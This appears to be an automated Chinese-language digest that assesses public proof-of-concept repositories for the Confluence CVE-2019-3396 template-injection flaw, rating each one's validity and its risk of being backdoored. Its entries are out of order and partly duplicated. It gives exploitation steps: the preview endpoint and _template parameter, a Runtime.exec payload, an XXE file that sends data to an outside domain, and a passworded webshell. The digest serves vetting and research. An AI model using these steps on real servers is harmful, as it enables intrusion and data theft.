3.  **服务器端模板注入：**  当 Confluence 服务器渲染包含恶意模板的页面时，Velocity 引擎会执行模板中的代码，从而导致服务器端代码执行。
4.  **远程代码执行：**  攻击者通过执行任意代码来控制 Confluence 服务器，可能包括执行系统命令、安装恶意软件等。

根据搜索结果中的一些文章，该漏洞已被用于传播加密货币矿工、GandCrab 勒索软件和 AESDDoS 僵尸网络恶意软件。

**项目地址:** [tno01/cve-2019-3396](https://github.com/tno01/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #19

**来源**: [CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md](../2019/CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.0 - 6.6.11, 6.7.0 - 6.12.2, 6.13.0 - 6.13.2, 6.14.0 - 6.14.1

**利用条件:** 需要能够访问存在漏洞的Confluence服务器，并能够在Confluence页面中插入或修改内容以利用 Widget Connector macro。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector macro 中，允许未经身份验证的远程攻击者通过服务器端模板注入 (SSTI) 执行任意代码。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector macro 渲染该模板，从而在 Confluence 服务器上执行命令。

**有效性：**
根据提供的漏洞信息，搜索引擎结果和漏洞利用代码，可以判断此漏洞是有效的。漏洞库信息明确指出该漏洞允许远程攻击者实现路径遍历和远程代码执行，搜索引擎结果中的文章也表明此漏洞已被积极利用，甚至被用于传播恶意软件。

**投毒风险：**
提供的漏洞利用代码主要包含以下几个文件：
*   `README.md`: 描述文件
*   `cmd.vm`, `cmd1.vm`, `cmd3.vm`: 包含 Velocity 模板代码，用于执行命令。这三个文件除了注释略有不同，核心代码相同。

代码的主要功能是：
1.  获取 Java Runtime 实例。
2.  执行用户提供的命令 (`$cmd`)。
3.  获取命令执行的输出流。
4.  使用 Scanner 读取输出流。
5.  返回命令执行的结果。

投毒风险分析：
由于这些脚本主要是为了执行任意命令，存在被用于恶意目的的风险。例如，攻击者可能会修改这些脚本，使其在执行目标命令的同时，执行一些隐蔽的恶意操作，如安装后门、收集敏感信息等。如果未经授权的人修改或者发布这些脚本，投毒风险就会提升。 总体来说，这些PoC更多的是payload，本身是无害的，风险主要来源于使用它们的人。但作者也可能在代码中隐藏一些不易察觉的后门代码，比如添加一个额外的命令执行，或者上传收集到的信息到恶意服务器。因此，存在一定的投毒风险，估计为 10%。

**利用方式：**
1.  攻击者需要构造包含恶意 Velocity 模板的 Confluence 页面或修改现有页面。
2.  利用 Widget Connector macro 渲染该恶意模板。
3.  恶意模板中的代码会在 Confluence 服务器上执行，从而实现远程代码执行。
4.  `$cmd` 变量需要通过某种方式传递到 Velocity 模板中，例如通过构造特定的请求参数。

总而言之，此漏洞的利用方式是通过构造恶意的Velocity模板，利用Confluence的Widget Connector Macro组件进行渲染，从而达到远程代码执行的目的。

**项目地址:** [vntest11/confluence_CVE-2019-3396](https://github.com/vntest11/confluence_CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #20

**来源**: [CVE-2019-3396-x-f1v3_CVE-2019-3396.md](../2019/CVE-2019-3396-x-f1v3_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Server-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 版本低于 6.6.12，6.7.0 到 6.12.3 之间，6.13.0 到 6.13.3 之间，6.14.0 到 6.14.2 之间

**利用条件:** 需要网络访问到Confluence服务器

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用 Velocity 模板引擎执行任意代码，从而实现远程代码执行。

**有效性：**

提供的POC代码是有效的。它演示了两种利用方式：

*   **远程代码执行（RCE）：** 通过修改`_template`参数，指向包含恶意 Velocity 模板的远程文件（1.vm）。该模板使用`java.lang.Runtime`类执行`ping your.dns.log`命令，可以验证RCE是否成功，同时可以替换成其他的恶意命令。
*   **本地文件包含（LFI）：** 通过修改`_template`参数，指向服务器上的敏感文件，如`../web.xml`，从而读取服务器上的文件内容。

**投毒风险：**

该存储库被投毒的风险较低，约为10%。判断依据如下：

*   仓库本身较为简单，只有一个RCE的vm文件和readme。从代码本身来看，恶意代码的可能性较低。
*   代码片段是直接命令ping，没有很强的迷惑性，因此投毒概率低。
*   参考搜索结果，此漏洞已经被广泛利用，出现恶意利用的情况，但POC本身相对直接。

**利用方式：**

1.  确定目标 Confluence Server 存在 CVE-2019-3396 漏洞。
2.  构造包含恶意 Velocity 模板的 HTTP POST 请求，发送到`/rest/tinymce/1/macro/preview`端点。
3.  在请求体中，设置`macro.params._template`参数为恶意 Velocity 模板的 URL 或目标服务器上的文件路径。
4.  发送请求后，如果漏洞存在，Confluence Server 将执行恶意 Velocity 模板中的代码，导致 RCE 或 LFI。

**示例：**

利用 RCE POC，攻击者可以通过修改 Velocity 模板中的命令，执行任意系统命令，例如上传 webshell、添加用户等。

利用 LFI POC，攻击者可以读取 Confluence Server 上的敏感配置文件，例如数据库连接信息、管理员密码等。

**注意：**

利用此漏洞进行攻击是非法的，仅供安全研究和渗透测试使用。

**项目地址:** [x-f1v3/CVE-2019-3396](https://github.com/x-f1v3/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #21

**来源**: [CVE-2019-3396-xiaoshuier_CVE-2019-3396.md](../2019/CVE-2019-3396-xiaoshuier_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本包括6.6.12之前, 6.7.0 - 6.12.3之前, 6.13.0 - 6.13.3之前, 6.14.0 - 6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏并且允许用户插入恶意模板。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是一个 Atlassian Confluence Server 中的服务器端模板注入漏洞。该漏洞存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板引擎执行任意代码。提供的POC代码使用Velocity模板语言，通过 `java.lang.Runtime` 类执行系统命令。此示例中，POC代码尝试启动 macOS 计算器应用程序。该POC的有效性取决于Confluence服务器上Velocity模板引擎的配置以及是否有安全策略阻止执行任意Java代码。根据搜索结果,此漏洞已被广泛利用,包括部署加密货币挖矿恶意软件和GandCrab勒索软件。

**利用方式：**
攻击者构造包含恶意Velocity模板代码的请求，Confluence服务器解析该模板时会执行攻击者注入的命令。通常是通过修改页面内容，添加包含恶意代码的Widget Connector宏来实现。

**投毒风险评估：**
提供的POC代码本身功能明确，即执行指定的系统命令。其中`/Applications/Calculator.app/Contents/MacOS/Calculator` 这个路径只是一个PoC，用于验证是否存在RCE，如果攻击者将这个路径改成下载恶意软件的命令,这可能会被识别为投毒。 除非攻击者能够找到方法在该POC中隐藏其他恶意行为（例如通过Base64编码或其他混淆技术隐藏反弹shell代码），否则直接的投毒风险较低。但是，攻击者可以修改这个PoC中的执行命令为任意命令，存在一定的投毒风险，所以风险比例为10%。

**项目地址:** [xiaoshuier/CVE-2019-3396](https://github.com/xiaoshuier/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #22

**来源**: [CVE-2019-3396-yuehanked_cve-2019-3396.md](../2019/CVE-2019-3396-yuehanked_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Macro-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 6.6.0 < version < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标系统存在受影响版本的Confluence，并且Widget Connector宏未被禁用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中 Widget Connector 宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector 宏在 Confluence 服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，该漏洞真实存在，且存在公开的PoC。提供的PoC代码 `windows.vm` 利用了 Velocity 模板引擎的特性，通过反射调用 `java.lang.Runtime` 类来执行系统命令。代码首先设置变量`e`为字符串"exp"，然后使用反射获取Runtime类的getRuntime()方法并调用，执行`cmd.exe /c $cmd`。 `$cmd` 变量需要在实际利用时替换为要执行的命令。该PoC代码有效。

**投毒风险分析：**

提供的PoC代码本身的功能是执行任意命令，虽然其中使用了`cmd.exe /c $cmd`，但正常使用该漏洞也需要用户传入执行命令，因此代码的功能就是利用漏洞进行RCE。 但需要评估是否存在作者故意添加的恶意代码，例如：

1.  **隐蔽的后门：** 代码中是否存在难以察觉的命令，用于植入后门或收集信息？
2.  **条件触发的恶意行为：** 代码是否包含在特定条件下才会触发的恶意行为？

假设存在一些不明显的行为（例如每隔一段时间尝试连接某个IP，或者尝试修改某些配置），则投毒风险可能较高。综合考虑POC本身的功能与检查隐藏的恶意行为的难度，评估投毒风险为 10%。

**利用方式分析：**

1.  **查找包含 Widget Connector 宏的 Confluence 页面。**
2.  **构造包含恶意 Velocity 模板的请求。** 这个模板通常会利用 Velocity 的表达式注入功能来执行任意代码。
3.  **发送构造好的请求到 Confluence 服务器。**
4.  **服务器解析 Velocity 模板，执行其中的恶意代码，实现远程代码执行。**

根据搜索结果，该漏洞已经被广泛利用，并且有多种攻击载荷被用于攻击。例如，有攻击者利用该漏洞部署加密货币挖矿程序和 Gandcrab 勒索软件。

**项目地址:** [yuehanked/cve-2019-3396](https://github.com/yuehanked/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---



---

## POC #12

**来源**: [CVE-2019-3396-kh4sh3i_CVE-2019-3396.md](../2019/CVE-2019-3396-kh4sh3i_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Server-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行

**影响版本:** 受影响版本：6.6.12之前, 6.7.0到6.12.3之前, 6.13.0到6.13.3之前, 6.14.0到6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入恶意模板

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是一个存在于Atlassian Confluence Server中的服务器端模板注入漏洞。该漏洞位于Widget Connector宏中，允许未经身份验证的远程攻击者利用Velocity模板引擎的缺陷执行任意代码。攻击者可以通过构造恶意的Widget Connector宏参数，将恶意Velocity模板注入到服务器端，从而执行任意系统命令。

**有效性评估：**

根据漏洞库信息和搜索结果，该漏洞是一个严重的安全问题，已被广泛利用，存在公开的POC（Proof of Concept）代码。

**投毒风险评估：**

提供的代码段仅包含CC0 1.0通用许可协议的文本。此代码段本身不包含任何可执行代码或恶意指令，因此不存在投毒风险的可能性。投毒风险为0%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **漏洞发现：** 确认目标Confluence服务器运行的是受影响的版本。
2.  **构造Payload：** 构建包含恶意Velocity模板的HTTP请求。这个payload通常会利用`#set`指令来定义变量，并使用`$Runtime.getRuntime().exec()`方法来执行系统命令。示例：`\u0024\{Runtime.getRuntime().exec("touch /tmp/success")\}` 
3.  **发送请求：** 将构造好的请求发送到Confluence服务器的Widget Connector宏处理端点。
4.  **代码执行：** 如果漏洞利用成功，服务器将执行payload中的系统命令。

**排序优先级解释：**

*   **搜索引擎结果：** 提供了漏洞的背景信息、影响和利用案例，有助于快速了解漏洞的严重程度和影响范围。
*   **漏洞利用代码：**  POC代码直接展示了漏洞的利用方式，可以用于验证漏洞和进行渗透测试。
*   **漏洞库信息：** 提供了漏洞的官方描述、受影响版本和修复建议，是了解漏洞细节的重要来源。

**项目地址:** [kh4sh3i/CVE-2019-3396](https://github.com/kh4sh3i/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #13

**来源**: [CVE-2019-3396-pyn3rd_CVE-2019-3396.md](../2019/CVE-2019-3396-pyn3rd_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence Server或Data Center实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前。

**利用条件:** 需要 Confluence 实例启用了 Widget Connector 宏，并且攻击者可以访问包含该宏的页面。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。 远程攻击者可以通过构造恶意的 Velocity 模板代码，利用该宏执行任意代码。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用是有效的。提供的POC代码包含两个文件：`calc.vm` 和 `os.vm`。

*   `calc.vm`: 该文件使用 Velocity 模板语言执行命令 `calc`（在Windows系统中会打开计算器）。这表明该漏洞能够执行任意命令。
*   `os.vm`: 该文件使用 Velocity 模板语言获取系统属性 `user.dir` (用户工作目录) 和 `user.name` (用户名)。这表明该漏洞可以读取服务器上的敏感信息。

利用方式：

1.  攻击者找到或创建一个包含 Widget Connector 宏的 Confluence 页面。
2.  攻击者在 Widget Connector 宏中插入恶意的 Velocity 模板代码，例如 `calc.vm` 或 `os.vm` 中的代码。
3.  当 Confluence 服务器渲染该页面时，会执行 Velocity 模板代码，从而导致远程代码执行或信息泄露。

关于投毒风险：

提供的POC代码没有明显的投毒代码。`calc.vm` 只是为了验证远程代码执行，`os.vm` 只是读取系统属性。此处的“投毒”指的是在POC中包含一些恶意代码，使得在测试漏洞时不经意间执行了恶意操作，或者留下后门。 提供的代码没有这种行为，因此投毒风险评估为0%。搜索引擎的结果也显示该漏洞在野外被利用来传播恶意软件，如加密货币矿工和勒索软件，表明该漏洞的真实风险很高。


**项目地址:** [pyn3rd/CVE-2019-3396](https://github.com/pyn3rd/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #14

**来源**: [CVE-2019-3396-quanpt103_CVE-2019-3396.md](../2019/CVE-2019-3396-quanpt103_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 小于6.6.12，6.7.0到小于6.12.3，6.13.0到小于6.13.3，6.14.0到小于6.14.2

**利用条件:** 需要 Confluence 实例存在 Widget Connector 宏，且目标版本未修复漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中。攻击者可以利用服务器端模板注入漏洞 (SSTI) 远程执行代码。根据漏洞库信息和搜索结果，该漏洞已经被广泛利用。提供的 POC 代码使用 Velocity 模板语言，尝试通过 `java.lang.Runtime` 类执行 `ipconfig` 命令。该命令本身无害，用于验证漏洞是否存在。由于poc只执行ipconfig命令，没有发现任何投毒代码。利用方式是构造恶意的 Velocity 模板，通过 Widget Connector 宏注入，从而在服务器上执行任意命令。

**项目地址:** [quanpt103/CVE-2019-3396](https://github.com/quanpt103/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #15

**来源**: [CVE-2019-3396-s1xg0d_CVE-2019-3396.md](../2019/CVE-2019-3396-s1xg0d_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence

**危害等级:** 高危，可能导致远程代码执行 (RCE) 和敏感信息泄露

**影响版本:** Confluence Server before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要能够向 Confluence Server 发送 HTTP 请求,并且 Widget Connector 宏可用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2019-3396 是 Atlassian Confluence 中 Widget Connector 宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板代码，利用 Widget Connector 宏的参数，在服务器端执行任意代码。

**有效性评估:**
根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞的POC代码是有效的。Exploit-DB 上的 46731 提供了利用该漏洞的 PoC。搜索引擎结果中也提到多个 PoC 的分析和实际攻击事件。

**投毒风险分析:**
提供的代码包含以下文件：
*   `README.md`: 描述了漏洞 CVE-2019-3396
*   `cmd.vm`: Velocity 模板，用于执行命令。该文件通过 Java 反射调用 `java.lang.Runtime` 来执行系统命令，其中 `$cmd` 变量应该是由攻击者控制的参数。
*   `evil.dtd`: 用于 XXE (XML External Entity) 攻击，尝试通过外部实体引入远程文件。此文件配置为访问 `http://phpshexxe.abcdef.5o1.in/?%file;` 看起来是一个尝试进行数据外泄的 URL
*   `os.vm`: Velocity 模板，用于获取服务器的操作系统信息和用户目录。它使用 Java 反射调用 `java.lang.System` 来获取系统属性。

`evil.dtd` 中的外部连接可能存在一定的风险，可能将服务器的文件内容发送到 `phpshexxe.abcdef.5o1.in`。这是一种潜在的数据泄露尝试。如果攻击者控制了该域名，他们就可以接收到 Confluence 服务器的文件内容。`phpshexxe.abcdef.5o1.in` 这个域名很可疑，具有进行恶意数据收集或攻击的可能性。但此行为更像是payload的一部分而非投毒。所以，投毒的概率相对较低，约为 5%。

**利用方式:**
利用方式主要包括以下步骤：

1.  **构造恶意 Velocity 模板:** 攻击者构造包含恶意代码的 Velocity 模板，例如 `cmd.vm` 中利用 Java 反射执行系统命令的代码。
2.  **利用 Widget Connector 宏:** 攻击者利用 Confluence 的 Widget Connector 宏，将构造好的恶意 Velocity 模板作为宏的参数传递给服务器。
3.  **服务器端执行:** Confluence 服务器解析 Widget Connector 宏时，会执行恶意 Velocity 模板中的代码，从而实现远程代码执行。
4. **XXE攻击:** `evil.dtd`文件可以配合其他payload尝试读取服务器文件，但依赖于服务器是否允许外部实体的解析。

总而言之，该漏洞的利用方式是典型的服务器端模板注入攻击，攻击者通过控制模板内容来执行任意代码。

**项目地址:** [s1xg0d/CVE-2019-3396](https://github.com/s1xg0d/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #16

**来源**: [CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md](../2019/CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md)

## CVE-2019-3396-Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器开启Widget Connector宏功能，并且攻击者能够访问该宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中的一个服务器端模板注入漏洞，存在于Widget Connector宏中。攻击者可以通过构造恶意的Velocity模板代码，利用此漏洞在Confluence服务器上执行任意代码。

**有效性:**
从漏洞库信息和搜索结果来看，此漏洞已被广泛证实存在，并且有公开的PoC（概念验证）代码。
提供的POC代码包含以下文件：
* `README.md`: 说明文件，描述漏洞和PoC的使用方法。
* `_template_test_info.txt`: 用于验证模板是否加载成功的简单文本文件。
* `rce.vm`: 包含Velocity模板代码，用于执行远程命令。
`rce.vm`中使用了Java反射来获取Runtime类，并执行指定的命令。这个PoC代码是有效的，可以用来验证漏洞是否存在。

**投毒风险:**
提供的PoC代码仅包含漏洞验证和利用的必要代码，没有发现任何隐藏的恶意代码或后门。因此，投毒风险为0%。

**利用方式:**
1.  攻击者需要找到一个Confluence页面，该页面使用了Widget Connector宏。
2.  攻击者在Widget Connector宏的配置中插入恶意的Velocity模板代码，例如`rce.vm`中的代码。
3.  当Confluence服务器渲染该页面时，会执行攻击者插入的Velocity模板代码，从而实现远程代码执行。
4.  攻击者可以利用此漏洞在服务器上执行任意命令，例如安装恶意软件、窃取敏感数据等。

**参考信息:**
*   NVD: [https://nvd.nist.gov/vuln/detail/cve-2019-3396](https://nvd.nist.gov/vuln/detail/cve-2019-3396)
*   Rapid7: [https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/](https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/)
*   Exploit-DB: [https://www.exploit-db.com/exploits/46731/](https://www.exploit-db.com/exploits/46731/)
*   CISA KEV: [https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396)

**项目地址:** [skommando/CVE-2019-3396-confluence-poc](https://github.com/skommando/CVE-2019-3396-confluence-poc)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #17

**来源**: [CVE-2019-3396-tanw923_test1.md](../2019/CVE-2019-3396-tanw923_test1.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且允许未授权访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞。攻击者可以通过操纵 Widget Connector 宏，注入恶意 Velocity 模板代码，从而在 Confluence 服务器上执行任意代码。

**有效性评估：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断此漏洞利用的有效性较高。漏洞库信息明确指出此漏洞允许远程攻击者通过服务器端模板注入实现路径遍历和远程代码执行。搜索引擎结果中也包含了大量的漏洞分析报告和利用示例，确认了该漏洞在野外已被积极利用，并可能被用于传播勒索软件或恶意挖矿程序。提供的POC代码仓库是一个简单的EXP，说明该漏洞存在可利用的POC.

**投毒风险评估：**

提供的代码片段 `include_1.jsp` 看起来像一个 Webshell，具备文件管理、数据库操作、命令执行等功能。 恶意代码比例较低，因为其本身就是webshell，为了完成漏洞的验证。因此投毒风险评估为 10%，这个比例反映了作者可能隐藏的用于维持权限或进行进一步攻击的代码的可能性，但主要功能是完成POC验证。

**利用方式分析：**

1.  **确定目标：** 找到存在漏洞版本的Confluence Server。
2.  **构造 Payload：** 构建包含恶意 Velocity 模板代码的请求。Payload通常利用`Widget Connector`宏的缺陷，将恶意代码注入到模板中。
3.  **发送请求：** 将构造好的 Payload 发送到目标 Confluence Server，触发模板引擎执行恶意代码。
4.  **远程代码执行：**  成功利用漏洞后，攻击者可以在目标服务器上执行任意命令，例如部署 Webshell、窃取敏感数据或进行其他恶意活动。

提供的`include_1.jsp` 文件实际上是一个后门，攻击者可以通过访问这个JSP页面并提供正确的密码（`xiaoma`）来执行各种操作，例如文件管理、数据库操作、命令执行等。利用漏洞部署webshell后，可以实现对服务器的控制。攻击者可以在服务器上上传、下载、修改和删除文件，查看和修改数据库中的数据，以及执行任意的系统命令。

**项目地址:** [tanw923/test1](https://github.com/tanw923/test1)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #18

**来源**: [CVE-2019-3396-tno01_cve-2019-3396.md](../2019/CVE-2019-3396-tno01_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 < version < 6.13.3, 6.14.0 < version < 6.14.2

**利用条件:** 需要能够访问存在 Widget Connector 宏的 Confluence 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞是 Atlassian Confluence Server 和 Data Center 中的一个服务器端模板注入（SSTI）漏洞。它存在于 Widget Connector 宏中，允许未经身份验证的远程攻击者通过构造恶意的 Velocity 模板，实现路径遍历和远程代码执行。漏洞影响的版本包括 6.6.12 之前的 6.6.x 版本，6.7.0 到 6.12.3 之前的 6.12.x 版本，6.13.0 到 6.13.3 之前的 6.13.x 版本，以及 6.14.0 到 6.14.2 之前的 6.14.x 版本。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞被广泛利用，存在公开的漏洞利用代码（例如 Exploit-DB 46731）。该漏洞已被 CISA 添加到已知被利用的漏洞目录中，表明其真实性和严重性。提供的 POC 代码 `/tmp/deed01dabaaab5a9c3b0b4b4d2014a34/README.md`  内容过于简单,仅包含标题 `# cve-2019-3396`，可能只是一个占位符，说明 POC 是存在的，但**需要结合其他信息确认具体的payload**。

**投毒风险：**

提供的 POC 代码只有一个 README 文件，内容非常简单，几乎没有投毒的可能。但是，完整的漏洞利用代码可能包含恶意代码。因为此README.md文件只是整个POC代码的一个组成部分. 考虑漏洞利用的复杂性和潜在的风险,投毒风险评估为10%。

**利用方式：**

1.  **定位存在 Widget Connector 宏的页面：**  攻击者需要找到 Confluence 实例中使用了 Widget Connector 宏的页面。
2.  **构造恶意 Velocity 模板：**  攻击者构造包含恶意代码的 Velocity 模板。该模板将被注入到 Widget Connector 宏中。
3.  **服务器端模板注入：**  当 Confluence 服务器渲染包含恶意模板的页面时，Velocity 引擎会执行模板中的代码，从而导致服务器端代码执行。
4.  **远程代码执行：**  攻击者通过执行任意代码来控制 Confluence 服务器，可能包括执行系统命令、安装恶意软件等。

根据搜索结果中的一些文章，该漏洞已被用于传播加密货币矿工、GandCrab 勒索软件和 AESDDoS 僵尸网络恶意软件。

**项目地址:** [tno01/cve-2019-3396](https://github.com/tno01/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #19

**来源**: [CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md](../2019/CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.0 - 6.6.11, 6.7.0 - 6.12.2, 6.13.0 - 6.13.2, 6.14.0 - 6.14.1

**利用条件:** 需要能够访问存在漏洞的Confluence服务器，并能够在Confluence页面中插入或修改内容以利用 Widget Connector macro。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector macro 中，允许未经身份验证的远程攻击者通过服务器端模板注入 (SSTI) 执行任意代码。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector macro 渲染该模板，从而在 Confluence 服务器上执行命令。

**有效性：**
根据提供的漏洞信息，搜索引擎结果和漏洞利用代码，可以判断此漏洞是有效的。漏洞库信息明确指出该漏洞允许远程攻击者实现路径遍历和远程代码执行，搜索引擎结果中的文章也表明此漏洞已被积极利用，甚至被用于传播恶意软件。

**投毒风险：**
提供的漏洞利用代码主要包含以下几个文件：
*   `README.md`: 描述文件
*   `cmd.vm`, `cmd1.vm`, `cmd3.vm`: 包含 Velocity 模板代码，用于执行命令。这三个文件除了注释略有不同，核心代码相同。

代码的主要功能是：
1.  获取 Java Runtime 实例。
2.  执行用户提供的命令 (`$cmd`)。
3.  获取命令执行的输出流。
4.  使用 Scanner 读取输出流。
5.  返回命令执行的结果。

投毒风险分析：
